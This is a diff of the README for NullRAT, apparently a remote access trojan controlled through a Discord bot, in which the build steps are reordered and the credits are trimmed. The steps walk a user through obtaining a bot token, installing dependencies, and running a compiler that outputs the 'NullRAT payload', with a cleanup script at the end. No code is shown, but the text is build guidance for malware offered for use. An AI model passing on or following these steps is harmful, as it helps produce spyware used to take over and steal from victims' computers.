@@ -54,13 +54,13 @@ Only people who know what they're doing should not use the compiler. I won't hel
 
 - [Create a Discord BOT and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
 - Dowload the latest release of NullRAT (git cloning/download zip will no longer work)
-- Run the Cleanup exe to clean up the source directory
 - Run the Dependencies Installer which will install all the necessary dependencies (except Python)
 - Before running the compiler, read [Getting Variables.md](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md) and grab all the variables you need
 - Run the Compiler, and feed it all the necessary information. NullRAT payload will be right there!
+- Finally, run the cleanup script to clean the source directory
 
 ## Credits
-1) Monst3red for inspiration
-2) Sp00p64 and [his RAT](https://github.com/Sp00p64/DiscordRAT)
+1) Monst3red 
+2) Sp00p64 
 
 <h5 align=right>Software designed by NullCode</h6>
